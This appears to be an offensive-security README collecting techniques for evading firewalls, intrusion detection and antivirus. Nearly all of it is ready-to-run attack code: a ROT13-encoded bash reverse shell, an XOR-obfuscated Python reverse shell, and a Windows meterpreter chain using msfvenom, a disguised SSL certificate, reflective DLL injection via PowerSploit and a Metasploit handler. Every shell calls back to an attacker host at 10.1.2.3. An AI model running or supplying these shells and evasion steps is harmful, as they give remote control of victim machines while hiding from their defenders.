# evasion
Techniques for evading firewalls and malware detection.

Acronyms used:
* UTM - Unified Threat Management.  A class of nextgen firewalls with integrated security features.
* IDS - Intrusion Detection System.  A device that detects malicious network traffic.
* IPS - Intrusion Prevention System.  A device that detects and blocks malicious network traffic.
* A/V - Anti-Virus, Anti-Malware, etc.

## ROT13 encoded reverse shell using bash TCP device

This technique is useful for getting a Linux reverse shell through a UTM firewall, IDS or IPS.

In this example the attacking host is on IP address 10.1.2.3 and listens on port 4444 for the reverse shell from the victim.

( attacker )<br />

[ linux command ]<br />
`IFS=''; (while read -r lin; do echo $lin | tr 'A-Za-z' 'N-ZA-Mn-za-m'; done) | nc -nlvp 4444 | tr 'A-Za-z' 'N-ZA-Mn-za-m'`<br />

( victim )<br />

[ linux command ]<br />
`exec 5<>/dev/tcp/10.1.2.3/4444; /bin/bash 2>&1 <(while read -r lin; do echo $(echo $lin | stdbuf -i0 -o0 -e0 tr 'A-Za-z' 'N-ZA-Mn-za-m'); done <&5) | stdbuf -i0 -o0 -e0 tr 'A-Za-z' 'N-ZA-Mn-za-m' >&5; exec 5<&-`<br />

## XOR obfuscated reverse shell using python

This technique is useful for getting a reverse shell through a UTM firewall, IDS or IPS on a system supporting Python.

In this example the attacking host is on IP address 10.1.2.3 and listens on port 4444 for the reverse shell from the victim.

( attacker )<br />

[ python script ]<br />
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4444))
s.listen(2)
print "Listening... "
(client, (ip, port)) = s.accept()
print " Received connection from : ", ip
while True:
  command = raw_input('~$ ')
  encode = bytearray(command)
  for i in range(len(encode)):
    encode[i] ^=0x5A
  client.send(encode)
  en_data=client.recv(2048)
  decode = bytearray(en_data)
  for i in range(len(decode)):
    decode[i] ^=0x5A
  print decode
client.close()
s.close()
```

( victim )<br />

[ python script ]<br />
```python
import socket,subprocess,sys
RHOST = "10.1.2.3"
RPORT = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
while True:
  data = s.recv(1024)
  en_data = bytearray(data)
  for i in range(len(en_data)):
    en_data[i] ^=0x5A
  comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  STDOUT, STDERR = comm.communicate()
  en_STDOUT = bytearray(STDOUT)
  for i in range(len(en_STDOUT)):
    en_STDOUT[i] ^=0x5A
  s.send(en_STDOUT)
s.close()
```

## Circumventing A/V on Windows to get meterpreter reverse shell

This technique is useful for getting a reverse shell on Windows where endpoint A/V protection is in place that blocks malicious DLLs and blocks malicious network connections such as the default meterpreter reverse_https SSL server certificate.

In this example the attacking host is Kali on IP address 10.1.2.3 and listens on port 443 for the reverse shell from the victim.  Powershell reflection will be used on the Windows victim to execute the meterpreter DLL.  The receiving Kali host will use metasploit multi-handler with a custom SSL certificate to accept the reverse HTTPS connection.

( attacker )<br />

First create your custom SSL certificate and private key.  The properties (e.g. Subject) used by the default certificate for reverse_https in metasploit that are sent during the SERVER HELLO phase may trigger host-based IDS/IPS so you will need to replace it with a certificate that has different Subject attributes.  Execute the following two commands to generate a replacement certificate.  This example assumes the output file msf.pem will be place into root's home folder.

`openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -subj "/C=US/ST=NY/L=Ithaca/O=Insanity/CN=pwned.you.org" -keyout msf.key -out msf.crt`<br />
`cat msf.key msf.crt > msf.pem`<br />

Generate the meterpreter DLL as a base64 blob that you will paste into the powershell script which will be executed on the Windows victim.

[ 32-bit meterpreter payload ]<br />
`msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=10.1.2.3 LPORT=443 -f dll | base64 -w 0`<br />
[ 64-bit meterpreter payload ]<br />
`msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=10.1.2.3 LPORT=443 -f dll | base64 -w 0`<br />

Create a powershell script called msf.ps1 that will be executed on the victim.  The powershell script will incorporate code developed by PowerShell Mafia to handle the reflective DLL injection.  The URL for the reflection code is here:

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

The msf.ps1 script should be constructed as follows:

`$b64_meterpreter_dll = '<paste base64 for DLL here>'`<br />
`$bytes = [Convert]::FromBase64String($b64_meterpreter_dll)`<br />
`<paste PowerShell Mafia code here>`<br />
`Invoke-ReflectivePEInjection -PEBytes $bytes -Verbose`<br />

Launch metasploit and start the multi-handler listener to receive the meterpreter reverse HTTPS payload.  Be sure to use the appropriate architecture (x86 or x64):

`msfconsole -q`<br />
`use exploit/multi/handler`<br />
`set payload windows/x64/meterpreter/reverse_https`<br />
`set lhost 10.1.2.3`<br />
`set lport 443`<br />
`set HandlerSSLCert /root/msf.pem`<br />
`set StagerVerifySSLCert false`<br />
`run`<br />

( victim )<br />

Deliver the msf.ps1 script to the Windows victim and execute it.
